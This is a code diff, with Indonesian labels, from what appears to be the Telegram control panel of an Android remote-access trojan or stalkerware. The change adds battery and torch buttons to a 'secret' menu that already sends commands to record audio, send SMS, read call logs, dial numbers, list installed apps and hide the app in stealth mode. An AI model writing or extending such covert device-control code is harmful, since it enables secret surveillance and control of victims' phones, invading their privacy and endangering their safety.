@@ -443,12 +443,13 @@ Format Eksekusi Manual:
         ];
 
         if (isSecret) {
-            menuBtns.splice(0, 5,
+            menuBtns.splice(0, 6,
                 [{ text: '✉️ Kirim SMS', callback_data: `runcmd:${devId}:sms_send` }, { text: '🔊 Record Audio', callback_data: `runcmd:${devId}:record_sound` }],
                 [{ text: '🗣 Text to Speech', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Push Notify', callback_data: `runcmd:${devId}:notify` }],
                 [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Set Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }],
                 [{ text: '📳 Getar HP', callback_data: `runcmd:${devId}:vibrate` }, { text: '🚨 Alarm Panik!', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
                 [{ text: '☎️ Call Log', callback_data: `runcmd:${devId}:get_call_logs` }, { text: '📲 Dial Number', callback_data: `runcmd:${devId}:dial_number` }],
+                [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch (Toggle)', callback_data: `runcmd:${devId}:torch` }],
                 [{ text: '👻 Hide (Stealth)', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '📻 Info Volume', callback_data: `runcmd:${devId}:get_volume` }],
                 [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: 'ℹ️ Info Sistem', callback_data: `runcmd:${devId}:get_device_info` }],
                 [{ text: '🎵 Play Sound', callback_data: `runcmd:${devId}:play_sound` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }],
